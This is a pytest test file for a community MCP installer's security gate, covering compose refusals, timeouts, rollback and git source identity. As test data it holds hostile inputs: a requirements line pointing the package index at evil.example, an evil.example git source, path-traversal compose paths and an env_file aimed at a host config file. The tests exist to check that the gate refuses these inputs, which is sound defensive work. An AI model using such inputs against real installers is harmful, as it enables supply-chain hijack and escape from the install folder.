"""The community install gate: a Docker-Compose refusal is judged before any
file moves, the incoming-tree checks run off the event loop, a catalog Python
folder ships no requirements file, the git source identity keeps host and
scheme, ``server.docker_compose`` names a file inside the MCP folder, a hung
package install times out and rolls back, and a remnant folder keeps only its
preserved data."""

from __future__ import annotations

import asyncio
import json
import os
import threading
from pathlib import Path

import pytest
import yaml
from fastapi import HTTPException

import config
from core.config import deployment
from services.community import community_installer as ci
from services.mcp import mcp_manifest_parse as mmp
from services.mcp import mcp_registry


@pytest.fixture
def mcps_dir(tmp_path, monkeypatch):
    root = tmp_path / "opt" / "otodock" / "mcps"
    (root / "community").mkdir(parents=True)
    monkeypatch.setattr(config, "MCPS_DIR", root)
    monkeypatch.setattr(mcp_registry, "_manifests", {})
    return root


@pytest.fixture
def t2(monkeypatch):
    """Docker-Compose mode with the container side stubbed: the gate's own
    rules are under test, not the daemon."""
    from services.mcp import docker_manager
    monkeypatch.setattr(deployment, "in_docker_compose", lambda: True)
    monkeypatch.setattr(deployment, "current_mode", lambda: deployment.MANAGED_SOCKPROX)
    monkeypatch.setattr(config, "OTODOCK_NETWORK", "otodock")
    monkeypatch.setattr(docker_manager, "_inject_mcp_env", lambda m: False)
    started: list[str] = []
    monkeypatch.setattr(docker_manager, "start_container",
                        lambda m, **kw: started.append(m.name) or True)
    return started


def _docker_manifest(name: str = "dock-mcp", **server) -> dict:
    return {
        "name": name, "label": "Dock", "description": "d", "version": "1.0.0",
        "category": "community",
        "server": {"runtime": "docker", "transport": "streamable_http",
                   "docker_compose": "docker-compose.yml", "port": 8080,
                   "image": "ghcr.io/otodock/dock:1", "source": "docker:dock",
                   **server},
    }


def _folder(tmp_path: Path, manifest: dict, tag: str, *, compose: dict | None = None,
            files: dict[str, str] | None = None) -> Path:
    src = tmp_path / "upload" / f"{manifest['name']}-{tag}"
    src.mkdir(parents=True)
    (src / "manifest.json").write_text(json.dumps(manifest))
    (src / "README.md").write_text(f"Dock {tag}.\n")
    if compose is not None:
        (src / "docker-compose.yml").write_text(yaml.safe_dump(compose))
    for rel, body in (files or {}).items():
        p = src / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    return src


CLEAN = {"services": {"dock": {"build": ".", "env_file": ".env"}}}
REFUSED = {"services": {"dock": {"build": ".", "env_file": "/opt/otodock/config.env"}}}


# ── a compose refusal is judged before any file moves ──────────────────

@pytest.mark.asyncio
async def test_a_refused_compose_update_keeps_the_installed_version(mcps_dir, tmp_path, t2):
    await ci.install_from_extracted_folder(_folder(tmp_path, _docker_manifest(), "a", compose=CLEAN))
    target = mcps_dir / "community" / "dock-mcp"
    before = sorted(p.relative_to(target) for p in target.rglob("*"))
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(version="2.0.0"), "b", compose=REFUSED))
    assert ei.value.status_code == 400
    assert "Docker-Compose mode" in ei.value.detail
    assert (target / "README.md").read_text() == "Dock a.\n"
    assert sorted(p.relative_to(target) for p in target.rglob("*")) == before
    assert not target.with_suffix(".bak").exists()
    assert mcp_registry.get_manifest("dock-mcp").version == "1.0.0"


@pytest.mark.asyncio
async def test_a_refused_compose_install_leaves_no_folder(mcps_dir, tmp_path, t2):
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(), "a", compose=REFUSED))
    assert ei.value.status_code == 400
    assert not (mcps_dir / "community" / "dock-mcp").exists()
    assert mcp_registry.get_manifest("dock-mcp") is None
    assert t2 == []


@pytest.mark.asyncio
async def test_a_docker_mcp_without_an_image_is_refused_before_any_file_moves(
        mcps_dir, tmp_path, t2):
    manifest = _docker_manifest()
    manifest["server"].pop("image")
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(_folder(tmp_path, manifest, "a", compose=CLEAN))
    assert ei.value.status_code == 400
    assert "pre-built image" in ei.value.detail
    assert not (mcps_dir / "community" / "dock-mcp").exists()


@pytest.mark.asyncio
async def test_a_clean_compose_installs_and_is_rewritten(mcps_dir, tmp_path, t2):
    result = await ci.install_from_extracted_folder(
        _folder(tmp_path, _docker_manifest(), "a", compose=CLEAN))
    assert result["status"] == "installed"
    written = yaml.safe_load((mcps_dir / "community" / "dock-mcp" / "docker-compose.yml").read_text())
    assert written["services"]["dock"]["image"] == "ghcr.io/otodock/dock:1"
    assert t2 == ["dock-mcp"]


# ── the incoming-tree checks run off the event loop ────────────────────

@pytest.mark.asyncio
async def test_the_incoming_tree_walk_runs_off_the_loop(mcps_dir, tmp_path, monkeypatch):
    seen: list[bool] = []
    real = ci._refuse_shipped_trees

    def _spy(root):
        seen.append(threading.current_thread() is threading.main_thread())
        return real(root)

    monkeypatch.setattr(ci, "_refuse_shipped_trees", _spy)
    manifest = {"name": "ctx-mcp", "label": "c", "description": "d", "version": "1",
                "category": "community", "server": {"runtime": "none", "transport": "none"}}
    await ci.install_from_extracted_folder(_folder(tmp_path, manifest, "a"))
    assert seen == [False]


# ── a catalog Python folder carries no requirements file ───────────────

@pytest.fixture
def fake_package_install(monkeypatch):
    calls: list[tuple[str, str]] = []

    async def _install(mcp_dir, runtime, source, **kw):
        calls.append((runtime, source))
        return ci.mcp_installer.InstallResult(
            ok=True, log="", version_hash="h", resolved_version="1.0.0",
        )

    monkeypatch.setattr(ci.mcp_installer, "install_mcp", _install)
    return calls


@pytest.mark.asyncio
async def test_a_python_catalog_folder_loses_its_requirements_file(
        mcps_dir, tmp_path, fake_package_install):
    manifest = {"name": "py-mcp", "label": "p", "description": "d", "version": "",
                "category": "community",
                "server": {"runtime": "python", "transport": "stdio",
                           "command": "venv/bin/py-mcp", "source": "pypi:py-mcp"}}
    src = _folder(tmp_path, manifest, "a",
                  files={"requirements.txt": "--index-url https://evil.example\nx\n"})
    await ci.install_from_extracted_folder(src)
    assert not (mcps_dir / "community" / "py-mcp" / "requirements.txt").exists()


@pytest.mark.asyncio
async def test_a_docker_catalog_folder_keeps_its_build_requirements(mcps_dir, tmp_path, monkeypatch):
    monkeypatch.setattr(deployment, "in_docker_compose", lambda: False)
    monkeypatch.setattr(deployment, "current_mode", lambda: deployment.EXTERNAL_POOL)
    src = _folder(tmp_path, _docker_manifest(), "a", compose=CLEAN,
                  files={"requirements.txt": "ffmpeg-python==0.2.0\n"})
    await ci.install_from_extracted_folder(src)
    assert (mcps_dir / "community" / "dock-mcp" / "requirements.txt").is_file()


# ── the git source identity ────────────────────────────────────────────

def _git(source: str) -> tuple[str, str]:
    return ci.source_identity(runtime="python", source=source, image="", url_template="")


def test_git_identity_with_userinfo_and_no_ref_keeps_the_host():
    assert _git("git+ssh://git@github.com/org/repo.git") != _git("git+ssh://git@evil.example/x/y.git")
    assert _git("git+https://user@host/org/repo.git") == ("git", "git+https://host/org/repo#")
    assert _git("git+ssh://git@github.com/org/repo.git@v1.2#subdirectory=mcp") == \
        ("git", "git+ssh://github.com/org/repo#mcp")


def test_git_identity_keeps_the_scheme():
    assert _git("git+https://host/r.git") != _git("git+http://host/r.git")
    assert _git("git+https://host/r.git@v1") == _git("git+HTTPS://HOST/r@v2")


def test_git_identity_refuses_an_ambiguous_subdirectory():
    kind, _ = _git("git+https://host/r.git#subdirectory=a&subdirectory=b")
    assert kind == "unknown"
    errors = ci._validate_manifest({
        "name": "g", "label": "g", "description": "d", "version": "1",
        "category": "community",
        "server": {"runtime": "python", "command": "x",
                   "source": "git+https://host/r.git#subdirectory=a&subdirectory=b"},
    })
    assert any("subdirectory" in e for e in errors)


# ── server.docker_compose names a file inside the folder ───────────────

@pytest.mark.asyncio
@pytest.mark.parametrize("rel", ["../other/docker-compose.yml", "/etc/compose.yml",
                                 "sub/../../x.yml"])
async def test_an_unconfined_compose_path_is_refused_at_the_gate(mcps_dir, tmp_path, rel):
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(docker_compose=rel), "a", compose=CLEAN))
    assert ei.value.status_code == 400
    assert "docker_compose" in ei.value.detail
    assert not (mcps_dir / "community" / "dock-mcp").exists()


@pytest.mark.parametrize("rel", ["../other/docker-compose.yml", "/etc/compose.yml"])
def test_an_unconfined_compose_path_is_dropped_at_parse(tmp_path, rel):
    d = tmp_path / "dock-mcp"
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(_docker_manifest(docker_compose=rel)))
    m = mmp._parse_manifest(d / "manifest.json")
    assert m is not None and m.server.docker_compose == ""


def test_a_confined_compose_path_parses(tmp_path):
    d = tmp_path / "dock-mcp"
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(_docker_manifest(docker_compose="deploy/compose.yml")))
    assert mmp._parse_manifest(d / "manifest.json").server.docker_compose == "deploy/compose.yml"


# ── a hung package install times out and rolls back ────────────────────

def _npm_manifest(version: str = "1.0.0") -> dict:
    return {"name": "node-mcp", "label": "n", "description": "d", "version": version,
            "category": "community",
            "server": {"runtime": "node", "transport": "stdio", "command": "node",
                       "args": ["node_modules/pkg/index.js"], "source": "npm:pkg"}}


def _alive(pid: int) -> bool:
    try:
        stat = Path(f"/proc/{pid}/stat").read_text()
    except OSError:
        return False
    return stat.rsplit(")", 1)[1].split()[0] not in ("Z", "X")


@pytest.mark.asyncio
@pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="reads /proc")
async def test_a_hung_package_install_times_out_and_rolls_back(mcps_dir, tmp_path, monkeypatch):
    """The installer's timeout bounds the package manager's whole run: a hung
    npm is killed with its children, the update fails with "Install timed
    out" and the previous version is back in place."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    pids = tmp_path / "npm.pids"
    hang = tmp_path / "npm.hang"
    npm = bin_dir / "npm"
    npm.write_text(
        "#!/bin/sh\n"
        f'echo $$ >> "{pids}"\n'
        f'if [ -f "{hang}" ]; then sleep 20 & echo $! >> "{pids}"; sleep 20; exit 0; fi\n'
        "mkdir -p node_modules/pkg && printf '{\"version\":\"1.0.0\"}' > node_modules/pkg/package.json\n")
    npm.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ.get('PATH', '/usr/bin')}")
    monkeypatch.setattr(ci, "_INSTALL_TIMEOUT_SECONDS", 1)

    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    target = mcps_dir / "community" / "node-mcp"
    hang.write_text("")
    with pytest.raises(HTTPException) as ei:
        await asyncio.wait_for(
            ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b")), 10)
    assert ei.value.status_code == 500
    assert "Install timed out" in ei.value.detail
    assert (target / "README.md").read_text() == "Dock a.\n"
    assert not target.with_suffix(".bak").exists()
    for _ in range(40):
        if not any(_alive(int(p)) for p in pids.read_text().split()):
            break
        await asyncio.sleep(0.05)
    assert not [p for p in pids.read_text().split() if _alive(int(p))]


# ── a remnant folder loses what the incoming folder does not carry ─────

@pytest.mark.asyncio
async def test_a_stray_patch_in_a_remnant_folder_is_gone_before_the_package_installs(
        mcps_dir, tmp_path, monkeypatch):
    seen: list[bool] = []

    async def _install(mcp_dir, runtime, source, **kw):
        seen.append((Path(mcp_dir) / "patches").exists())
        return ci.mcp_installer.InstallResult(ok=True, log="", version_hash="h",
                                              resolved_version="1.0.0")

    monkeypatch.setattr(ci.mcp_installer, "install_mcp", _install)
    remnant = mcps_dir / "community" / "node-mcp"
    (remnant / "patches").mkdir(parents=True)
    (remnant / "patches" / "stray.patch").write_text("x")
    (remnant / "keys").mkdir()
    (remnant / "keys" / "id").write_text("k")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    assert seen == [False]
    assert (remnant / "keys" / "id").read_text() == "k"
